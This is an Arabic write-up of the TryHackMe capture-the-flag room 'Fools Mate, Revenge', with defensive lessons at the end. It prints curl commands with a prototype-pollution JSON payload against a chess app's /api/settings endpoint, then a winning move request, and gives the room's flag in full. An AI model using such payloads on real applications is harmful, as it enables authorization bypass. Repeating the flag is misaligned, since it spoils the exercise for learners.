# حل غرفة Fools Mate, Revenge

> **الحالة:** مكتملة رسمياً داخل TryHackMe، مع قبول إجابة Task 1 وظهور صفحة `Room completed`.

## معلومات الغرفة

| البيان | القيمة |
|---|---|
| اسم الغرفة | Fools Mate, Revenge |
| الرابط الرسمي | [TryHackMe — Fools Mate, Revenge][1] |
| المختبر | `FoolsM8_V2_v1` |
| الهدف | `10.48.138.51:3000` |
| AttackBox | `10.48.178.183` |
| المهمة | Task 1 — What is the flag? |
| النتيجة | 100% / Room completed |

تتناول الغرفة تطبيق شطرنج ويب، وتطلب تجاوز بوابة المكافأة ثم تنفيذ حركة كش مات. بعد إدخال الإجابة الصحيحة في صفحة الغرفة، أكدت TryHackMe الإكمال الرسمي برسالة: **Great work 9gkc! Room completed!**.[1]

## الإجابة المؤكدة

| المهمة | السؤال | الإجابة | التحقق |
|---|---|---|---|
| Task 1 | What is the flag? | `THM{pr0t0_p0lluted_th3_r3f3r33}` | **Correct Answer** ثم صفحة **Room completed** داخل TryHackMe |

يجب الانتباه إلى أن نهاية العلم هي `r3f3r33`: الحرفان الأخيران رقمان `3`، وليسا الحرفين `e` أو صيغة مشابهة.

## التحليل المختصر

تعمل الواجهة على تطبيق Node.js/Express عبر المنفذ 3000. الحركة المباشرة بالرخ الأبيض من `a1` إلى `a8` تحقق كش مات، لكن الإصدار Revenge يضع بوابة تمنع إعادة العلم حتى يصبح إعداد الجلسة المطلوب موجوداً. تشير استجابة الحركة إلى مسار إعداد داخلي مرتبط ببوابة المكافأة، ولذلك يتحول مسار الاختبار إلى واجهة حفظ التفضيلات `/api/settings`.[1] [2]

المشكلة الأمنية هي **Prototype Pollution**. تقبل نقطة الإعدادات كائن JSON من المستخدم، ثم يؤدي دمج مفاتيح مثل `constructor` و`prototype` دون تصفية مناسبة إلى تعديل سلسلة النموذج الأولي في JavaScript. يوضح الشرح التفصيلي أن الحمولة المسطحة التي تضع `config` على قيمة منطقية صحيحة تتجنب التكرار العميق الذي قد يؤدي إلى `RangeError`، ثم تسمح بإعادة تنفيذ حركة كش مات للحصول على العلم.[2]

> تنبيه عملي: لا تُستخدم حمولة متداخلة مثل `config: { unlocked: true }` في هذه الغرفة إذا أدت إلى recursion أو stack overflow. الحمولة الناجحة الموثقة هنا تستخدم `config: true` مباشرة داخل `constructor.prototype`.[2]

## خطوات الحل

### 1. تحديد التطبيق والحركة

من AttackBox يُفتح التطبيق عبر:

```text
http://10.48.138.51:3000
```

الحركة المطلوبة هي نقل الرخ من المربع `a1` إلى المربع `a8`. إرسالها قبل تجاوز البوابة يحقق حالة كش مات، لكنه لا يعيد العلم.

### 2. تلويث النموذج الأولي عبر `/api/settings`

تُرسل تفضيلات صحيحة مع كائن `constructor.prototype` الإضافي:

```bash
curl -s -X POST http://10.48.138.51:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}'
```

والجسم بصيغة JSON هو:

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180,
  "constructor": {
    "prototype": {
      "config": true
    }
  }
}
```

الفكرة أن الدمج غير الآمن يجعل الخاصية المحقونة متاحة عبر سلسلة النموذج الأولي للكائنات التي يعتمد عليها منطق الجلسة. استخدام قيمة بدائية مسطحة لـ`config` هو الجزء المهم في هذا الإصدار؛ فهو يتجنب البنية المتداخلة التي قد تجعل دالة الدمج تدخل في استدعاء ذاتي متكرر.[2]

### 3. إعادة تنفيذ الحركة الفائزة

بعد إرسال الحمولة، تُرسل حركة كش مات مرة أخرى:

```bash
curl -s -X POST http://10.48.138.51:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

إذا نجح التجاوز، تكون الاستجابة مرتبطة بحالة `checkmate` وتحتوي على العلم. ويمكن أيضاً إتمام الغرفة مباشرة من واجهة TryHackMe بإدخال العلم في حقل Task 1.

## التحقق داخل TryHackMe

تم إدخال العلم التالي في حقل السؤال:

```text
THM{pr0t0_p0lluted_th3_r3f3r33}
```

بعد الضغط على **Check** ظهرت صفحة التهنئة الرسمية بعنوان مسار `congratulations`، وتضمنت العبارة **Great work 9gkc! Room completed!**. وعليه تم التحقق من الإجابة داخل المنصة، وليس بالاعتماد على نتيجة مرجعية خارجية فقط.

## الدروس الأمنية

توضح الغرفة أن إضافة ميزة تبدو غير خطرة، مثل حفظ تفضيلات الواجهة، قد تفتح مساراً جديداً للهجوم إذا عولج JSON بدمج عميق غير آمن. ينبغي رفض المفاتيح `__proto__` و`constructor` و`prototype` قبل الدمج، أو استخدام كائنات بلا نموذج أولي مثل `Object.create(null)`، مع تجنب كشف أسماء خصائص داخلية حساسة في رسائل الخطأ.[2]

## المراجع

[1]: https://tryhackme.com/room/foolsm8v2 "TryHackMe — Fools Mate, Revenge"

[2]: https://medium.com/@rayenhafsawy/fools-mate-revenge-tryhackme-writeup-with-flags-652560b2dc31 "Rayen Hafsawy — Fools Mate, Revenge: TryHackMe WriteUp with Flags"

---


إطار الاستخدام: جميع الخطوات ضمن مختبر TryHackMe المصرح به ولأغراض تعليمية ودفاعية.

---

## ملاحظات وأدلة مساندة

## بيانات الغرفة

- **العنوان:** Fools Mate, Revenge
- **الرابط:** https://tryhackme.com/room/foolsm8v2
- **المنصة:** TryHackMe
- **المختبر:** FoolsM8_V2_v1
- **عنوان الهدف:** `10.48.138.51:3000`
- **عنوان AttackBox:** `10.48.178.183`
- **المهمة:** Task 1 — What is the flag?
- **الحالة النهائية:** مكتملة رسمياً؛ ظهرت صفحة `Great work 9gkc! Room completed!` بعد التحقق من الإجابة.

## ملاحظات التنفيذ

تطبيق الغرفة عبارة عن تطبيق شطرنج ويب يعمل عبر Node.js/Express على المنفذ 3000. الحركة الفائزة هي نقل الرخ الأبيض من `a1` إلى `a8`، لكن إرسال الحركة قبل تجاوز بوابة المكافأة لا يعيد العلم. تكشف استجابة الحركة أن البوابة تعتمد على إعداد جلسة غير مضبوط، وهو ما يوجّه الاختبار إلى نقطة حفظ الإعدادات `/api/settings`.[1] [2]

الثغرة هي **Prototype Pollution** ناتجة عن دمج JSON يرسله المستخدم دون تصفية المفاتيح الحساسة مثل `constructor` و`prototype`. الحمولة المسطحة التي وثّقها الشرح التفصيلي وتجنبت التكرار العميق هي:

```json
{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}
```

أمر الإرسال إلى المختبر، عند الحاجة إلى إعادة التجربة من AttackBox، هو:

```bash
curl -s -X POST http://10.48.138.51:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}'
```

بعد ذلك تُرسل حركة كش ملك:

```bash
curl -s -X POST http://10.48.138.51:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

## العلم المؤكد

```text
THM{pr0t0_p0lluted_th3_r3f3r33}
```

تم إدخال القيمة في حقل Task 1 داخل صفحة TryHackMe وضغط **Check**. ظهرت صفحة التهنئة الرسمية وأكدت أن الغرفة مكتملة، لذلك فهذه القيمة ليست مجرد إجابة من شرح خارجي بل إجابة تم قبولها داخل الغرفة نفسها.[1]

## ملاحظات تشغيلية

حاولت قراءة ناتج أوامر الشبكة من طرفية AttackBox، لكن طبقة العرض البعيدة لم تستخرج نص مخرجات الطرفية بصورة موثوقة. لم يؤثر ذلك في النتيجة؛ فقد تم التحقق النهائي من العلم عبر واجهة TryHackMe، ثم ظهرت صفحة `Room completed`.

## المراجع

[1]: https://tryhackme.com/room/foolsm8v2 "TryHackMe — Fools Mate, Revenge"

[2]: https://medium.com/@rayenhafsawy/fools-mate-revenge-tryhackme-writeup-with-flags-652560b2dc31 "Rayen Hafsawy — Fools Mate, Revenge: TryHackMe WriteUp with Flags"

---

إطار الاستخدام: مختبر TryHackMe مصرح به وتعليمي فقط.
